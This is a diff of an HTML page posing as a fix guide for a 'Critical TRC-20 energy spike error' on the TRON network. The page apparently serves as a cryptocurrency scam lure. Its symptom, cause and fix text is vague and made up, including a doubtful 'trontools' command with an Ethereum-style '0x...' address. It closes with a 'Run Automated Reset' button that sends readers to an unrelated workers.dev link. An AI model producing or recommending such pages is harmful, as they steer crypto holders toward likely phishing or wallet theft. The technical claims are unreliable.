@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Critical Trc 20 Energy Spike Error</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: sans-serif;
         background: #0f111a;
         color: #ddd;
         padding: 20px;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,32 +41,27 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an unusual increase in energy consumption by a TRC-20 smart contract on the TRON network, leading to failed transactions or contract executions.</li>
+<li>Users experience a "Critical TRC-20 energy spike error" when attempting to execute smart contracts or transfer tokens on the TRON network, resulting in failed transactions and significant energy consumption.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs when a TRC-20 smart contract exceeds the allowed energy limit, causing the contract execution to fail and resulting in the error message.</li>
+<li>The error occurs due to an unexpected surge in energy consumption by a TRC-20 token contract, exceeding the maximum allowed energy limit, which is a critical parameter in the TRON Virtual Machine (TVM).</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Adjust the contract's energy limit by modifying the contract code to optimize energy consumption.</li>
-<li>Implement a retry mechanism with exponential backoff to handle temporary energy spikes.</li>
-<li>Use a TRON network explorer to monitor contract energy usage and identify potential issues before they occur.</li>
+<li>Adjust the <code>energyLimit</code> parameter in the contract deployment script to a higher value to accommodate the increased energy requirements.</li>
+<li>Implement a custom <code>energyPrice</code> feed to dynamically adjust the energy cost based on network conditions.</li>
+<li>Optimize contract code to reduce computational complexity and energy consumption:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;contract&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000000</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;energyUsage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">500000</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>trontools<span class="w"> </span>contract<span class="w"> </span>update<span class="w"> </span>--energy_limit<span class="w"> </span><span class="m">1000000</span><span class="w"> </span>--contract_address<span class="w"> </span>0x...
 </code></pre></div>
 
-<p>Consider utilizing an external console for more detailed analysis and debugging. </p>
+<p>Consider utilizing an external console for more advanced contract debugging and optimization.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Basic understanding of TRON smart contract development</li>
-<li>Familiarity with TRC-20 token standards</li>
-<li>Access to a TRON network node or explorer</li>
+<li>TRON network node setup with TVM enabled</li>
+<li>TRC-20 token contract deployment script</li>
+<li>trontools command-line interface installed and configured</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
